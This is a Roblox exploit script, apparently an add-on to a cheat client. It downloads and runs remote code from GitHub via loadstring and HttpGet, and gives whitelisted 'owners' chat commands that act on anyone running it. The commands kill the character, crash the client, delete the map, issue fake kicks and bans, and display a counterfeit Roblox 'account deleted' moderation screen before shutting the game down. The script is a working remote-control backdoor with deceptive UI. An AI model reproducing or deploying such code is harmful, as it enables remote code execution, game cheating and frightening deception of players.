local lplr = game:GetService("Players").LocalPlayer
local playersService = game:GetService("Players")
local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/whitelistedforsunnyzprivate.lua"))()
local FunctionsLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/NightbedForRoblox/main/Libraries/FunctionsHandler.lua"))()
local entityLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua"))()

local funcs = {}
function funcs:kill()
	local req = require(lplr.PlayerScripts.TS.controllers.global.damage["damage-controller"]).DamageController
	local req2 = require(game:GetService("ReplicatedStorage").TS.damage["damage-type"]).DamageType
	req.requestSelfDamage(nil,9e9,req2.FALL)
end
function funcs:reset()
	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
end
function funcs:kill2()
	lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
end
function funcs:lagback()
	for i = 1,5 do
		lplr.Character.HumanoidRootPart.CFrame = CFrame.new(999999,999999,999999)
	end
end
function funcs:jump()
	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end
function funcs:sit()
	lplr.Character.Humanoid.Sit = true
end
function funcs:unsit()
	lplr.Character.Humanoid.Sit = false
end
function funcs:pstand()
	lplr.Character.Humanoid.PlatformStand = true
end
function funcs:unpstand()
	lplr.Character.Humanoid.PlatformStand = false
end
function funcs:freeze()
	lplr.Character.HumanoidRootPart.Anchored = true
end
function funcs:unfreeze()
	lplr.Character.HumanoidRootPart.Anchored = false
end
function funcs:deletemap()
		for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
			v:Destroy()
		end
end
function funcs:crash()
	if setfpscap then setfpscap(99e99) end
	if set_fps_cap then set_fps_cap(99e99) end
	print(game:GetObjects("h29g3535")[1])
end
function funcs:chipman()
			function funny(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funny(v)
		end
		game.DescendantAdded:Connect(function(v) funny(v) end)
end
function funcs:rickroll()
			function funny(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funny(v)
		end
		game.DescendantAdded:Connect(function(v) funny(v) end)
end
function funcs:uninject()
	if shared.GuiLibrary then
		local GL = shared.GuiLibrary
		GL.SelfDestruct()
	end
end
function funcs:byfron()
	task.spawn(function()
		local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
		local Roact = getrenv().require(game:GetService("CorePackages").Roact)
		UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
		local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
		local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
		local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
		local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
		local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
		lplr.PlayerGui:ClearAllChildren()
		game:GetService("CoreGui"):ClearAllChildren()
			for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
				task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
			end
function funcs:kick(reason)
	reason = reason or "Imagine Got Kicked L"
	lplr:Kick(reason)
end
function funcs:lobby()
	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
end
function funcs:reinject()
	if shared.GuiLibrary then
		local GL = shared.GuiLibrary
		GL.SelfDestruct()
		repeat task.wait() until not shared.VapeExecuted and not shared.VapeFullyLoaded and not shared.GuiLibrary
		task.wait(0.5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	end
end
function funcs:ban()
	task.spawn(function()
		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
	end)
	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
end
function funcs:void()
	lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -35, 0)
end
function sysmsg(text, color)
    game.StarterGui:SetCore(
        "ChatMakeSystemMessage",
        {
            Text = text,
            Color = (color or Color3.fromRGB(255, 255, 255)),
            Font = Enum.Font.SourceSans,
            FontSize = Enum.FontSize.Size24
        }
    )
end

spawn(function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
	if table.find(whitelist.Owners,v.UserId) then
			sysmsg("{DETECTED} OWNER WAS IN YOU GAME")
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC2", "All")
		end
	end
	game:GetService("Players").ChildAdded:Connect(function(v)
		if table.find(whitelist.Owners,v.UserId) then
			sysmsg("[DETECTED] OWNER WAS IN YOU GAME!")
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC", "All")
		end
	end)
end)

for i,v in pairs(game:GetService("Players"):GetChildren()) do
	v.Chatted:Connect(function(a) 
		if table.find(whitelist.Owners,v.UserId) then
			if a == ";kill" then
				funcs:kill()
			elseif a == ";reset" then
				funcs:reset()
			elseif a == ";byfron" then
				funcs:byfron()
			elseif a == ";void" then
				funcs:void()
			elseif a == ";kill2" then
				funcs:kill2()
			elseif a == ";lagback" then
				funcs:lagback()
			elseif a == ";sit" then
				funcs:sit()
			elseif a == ";unsit" then
				funcs:unsit()
			elseif a == ";freeze" then
				funcs:freeze()
			elseif a == ";unfreeze" then
				funcs:unfreeze()
			elseif a == ";deletemap" then
				funcs:deletemap()
			elseif a == ";crash" then
				funcs:crash()
			elseif a == ";chipman" then
				funcs:chipman()
			elseif a == ";rickroll" then
				funcs:rickroll()
			elseif a == ";uninject" then
				funcs:uninject()
			elseif a == ";kick" then
				funcs:kick()
			elseif a == ";ban" then
				funcs:ban()
			elseif a == ";lobby" then
				funcs:lobby()
			end
		end
	end)
end
game:GetService("Players").PlayerAdded:Connect(function(v)
	v.Chatted:Connect(function(a) 
		if table.find(whitelist.Owners,v.UserId) then
			if a == ";kill" then
				funcs:kill()
			elseif a == ";reset" then
				funcs:reset()
			elseif a == ";byfron" then
				funcs:byfron()
			elseif a == ";void" then
				funcs:void()
			elseif a == ";kill2" then
				funcs:kill2()
			elseif a == ";lagback" then
				funcs:lagback()
			elseif a == ";sit" then
				funcs:sit()
			elseif a == ";unsit" then
				funcs:unsit()
			elseif a == ";freeze" then
				funcs:freeze()
			elseif a == ";unfreeze" then
				funcs:unfreeze()
			elseif a == ";deletemap" then
				funcs:deletemap()
			elseif a == ";crash" then
				funcs:crash()
			elseif a == ";chipman" then
				funcs:chipman()
			elseif a == ";rickroll" then
				funcs:rickroll()
			elseif a == ";kick" then
				funcs:kick()
			elseif a == ";ban" then
				funcs:ban()
			elseif a == ";lobby" then
				funcs:lobby()
			end
		end
	end)
end)